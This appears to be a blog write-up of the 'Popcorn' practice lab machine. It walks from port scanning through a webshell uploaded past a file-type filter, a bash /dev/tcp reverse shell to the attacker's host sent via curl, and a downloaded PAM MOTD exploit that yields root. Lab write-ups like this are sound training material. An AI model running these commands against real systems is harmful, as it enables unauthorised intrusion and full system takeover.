---
layout: post
title:  "Popcorn"
date:   2023-11-02 22:55:30 -0400
categories: jekyll update
---

Popcorn

<img
  src="/assets/popcorrn.png"
  alt="featured image"
  class="featured-image-post"
/>

## nmap
```
â””â”€# nmap -p- 10.10.10.6     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-02 18:53 EDT
Nmap scan report for 10.10.10.6
Host is up (0.052s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.97 seconds
```

```
â””â”€# nmap -p 22,80 -sC -sV 10.10.10.6           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-02 18:56 EDT
Nmap scan report for 10.10.10.6
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3ec81b15211550ec6e63bcc56b807b38 (DSA)
|_  2048 aa1f7921b842f48a38bdb805ef1a074d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.11 seconds
```

## gobuster
```
â””â”€# gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --timeout 20s 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 20s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47016]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]
Progress: 28643 / 220561 (12.99%)[ERROR] Get "http://10.10.10.6/AbleFtp": context
```

### 10.10.10.6:80
<img
  src="/assets/popcorn/Pasted image 20231102185842.png"
  alt="featured image"
  class="featured-image-post"
/>

### 10.10.10.6/test
<img
  src="/assets/popcorn/Pasted image 20231102214854.png"
  alt="featured image"
  class="featured-image-post"
/>

### 10.10.10.6/rename
<img
  src="/assets/popcorn/Pasted image 20231102215443.png"
  alt="featured image"
  class="featured-image-post"
/>
### 10.10.10.6/torrent
<img
  src="/assets/popcorn/Pasted image 20231102215613.png"
  alt="featured image"
  class="featured-image-post"
/>

<img
  src="/assets/popcorn/Pasted image 20231102215710.png"
  alt="featured image"
  class="featured-image-post"
/>

After registering an account, I browsed around and found an upload page. I downloaded a legit torrent file and uploaded it.
<img
  src="/assets/popcorn/Pasted image 20231102222727.png"
  alt="featured image"
  class="featured-image-post"
/>
<img
  src="/assets/popcorn/Pasted image 20231102222630.png"
  alt="featured image"
  class="featured-image-post"
/>

After uploading, there is a button to upload a screenshot.
<img
  src="/assets/popcorn/Pasted image 20231102222830.png"
  alt="featured image"
  class="featured-image-post"
/>
<img
  src="/assets/popcorn/Pasted image 20231102222908.png"
  alt="featured image"
  class="featured-image-post"
/>

I chose a random screenshot, this kali  logo and uploaded it.
<img
  src="/assets/popcorn/Pasted image 20231102224231.png"
  alt="featured image"
  class="featured-image-post"
/>

I captured the request in Burp and changed the extension to php and the content to a php webshell. At first I had to play around with Repeater to see which filters were in place, but this way submitted without errors.
<img
  src="/assets/popcorn/Pasted image 20231102224207.png"
  alt="featured image"
  class="featured-image-post"
/>

I refreshed and there is the screenshot.
<img
  src="/assets/popcorn/Pasted image 20231102224533.png"
  alt="featured image"
  class="featured-image-post"
/>


After some guessing I found the image at `/torrent/upload`
<img
  src="/assets/popcorn/Pasted image 20231102225457.png"
  alt="featured image"
  class="featured-image-post"
/>
<img
  src="/assets/popcorn/Pasted image 20231102225543.png"
  alt="featured image"
  class="featured-image-post"
/>
I test out execution with a simple`id` command with curl and its successful:
```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/spacemoth/machines/popcorn]
â””â”€# curl http://10.10.10.6/torrent/upload/2becb0265247e56217dcac4f5ff7308699ee0d3e.php?cmd=id      
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

## Shell

I will start netcat and use this line to get a reverse shell:
```
curl http://10.10.10.6/torrent/upload/2becb0265247e56217dcac4f5ff7308699ee0d3e.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.24/443 0>&1'"
```

```
â””â”€$ nc -lnvp 443 
listening on [any] 443 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.6] 36235
bash: no job control in this shell                                                                                                               
www-data@popcorn:/var/www/torrent/upload$
```

I got the shell and now I will upgrade:
```
python -c 'import pty;pty.spawn("bash")'
```

Obtain user flag:
```
www-data@popcorn:/home$ ls 
ls
george
www-data@popcorn:/home$ cat george
cat george
cat: george: Is a directory
www-data@popcorn:/home$ cd george
cd george
www-data@popcorn:/home/george$ ls
ls
torrenthoster.zip  user.txt
www-data@popcorn:/home/george$ cat user.txt                                      cat user.txt                                                            
3b0************************
```

## PrivEsc

I found `motd.legal-displayed` and knowing this file can lead to code execution I found this exploit after some googling, https://www.exploit-db.com/exploits/14339. I downloaded the exploit and hosted it on my machine:
```
â””â”€$ python2.7 -m SimpleHTTPServer 1337                                  
Serving HTTP on 0.0.0.0 port 1337 ...
```

On victim machine I used `wget` to download it:
```
www-data@popcorn:/tmp$ wget http://10.10.14.24:1337/14339.sh 
wget http://10.10.14.24:1337/14339.sh 
--2023-11-03 05:15:40--  http://10.10.14.24:1337/14339.sh
Connecting to 10.10.14.24:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3042 (3.0K) [text/x-sh]
Saving to: `14339.sh'

100%[======================================>] 3,042       --.-K/s   in 0s      

2023-11-03 05:15:40 (124 MB/s) - `14339.sh' saved [3042/3042]
```

I then chmod the file and ran it, which lead to root:
```
www-data@popcorn:/tmp$ chmod +x 14339.sh
chmod +x 14339.sh
www-data@popcorn:/tmp$ ./14339.sh
./14339.sh
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: toor

root@popcorn:/tmp# whoami
whoami
root
```

##### Root Flag
```
root@popcorn:/# cd root
cd root
root@popcorn:~# ls
ls
root.txt
root@popcorn:~# cat root.txt
cat root.txt
850*****************************
```
